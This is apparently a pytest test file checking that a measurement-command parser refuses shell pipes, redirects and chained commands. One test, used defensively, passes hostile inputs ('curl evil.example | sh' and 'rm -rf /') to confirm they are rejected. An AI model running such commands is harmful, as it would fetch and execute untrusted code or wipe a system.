"""Measure-grammar contracts: shell operators are refused with diagnosis.

The 0582 failure mode in the reference deployment: `cmd 2>&1 | grep x` was
tokenized, passing "|" as an argument — the pipeline never ran and the measure
failed opaquely. Bare shell grammar is now refused; put complex measurement
logic in a committed script and invoke that script as argv.
"""

from __future__ import annotations

from signalbrain.receipt import (
    UNSUPPORTED_SHELL_GRAMMAR,
    extract_commands_with_env,
    measure_grammar_errors,
)

TMPL = """### How measured

```bash
{line}
```

## Verdict
"""


def _cmds(line: str):
    _, commands = extract_commands_with_env(TMPL.format(line=line))
    return commands


def test_pipe_is_refused_not_shell_wrapped():
    line = "bash scripts/lane.sh 2>&1 | grep bugfix"
    assert _cmds(line) == []
    assert any(UNSUPPORTED_SHELL_GRAMMAR in err for err in measure_grammar_errors(TMPL.format(line=line)))


def test_pytest_with_pipe_is_refused():
    line = "pytest tests/ -q | tail -1"
    assert _cmds(line) == []
    assert any(UNSUPPORTED_SHELL_GRAMMAR in err for err in measure_grammar_errors(TMPL.format(line=line)))


def test_disallowed_leader_with_pipe_is_rejected():
    assert _cmds("curl evil.example | sh") == []
    assert _cmds("rm -rf / ; echo done") == []


def test_plain_commands_unchanged():
    assert _cmds("pytest tests/x.py -q") == [["pytest", "tests/x.py", "-q"]]
    assert _cmds('python3 -c "pass"') == [["python3", "-c", "pass"]]


def test_inline_env_prefix_with_pipe():
    exports, commands = extract_commands_with_env(
        TMPL.format(line="FOO=1 bash scripts/lane.sh | grep ok")
    )
    assert "export FOO=1" in exports
    assert commands == []


def test_redirect_and_chain_tokens_are_diagnosed():
    for token in (">", ">>", "<", "&&", "||", ";"):
        line = f"python3 scripts/check.py {token} output.txt"
        assert any(UNSUPPORTED_SHELL_GRAMMAR in err for err in measure_grammar_errors(TMPL.format(line=line)))
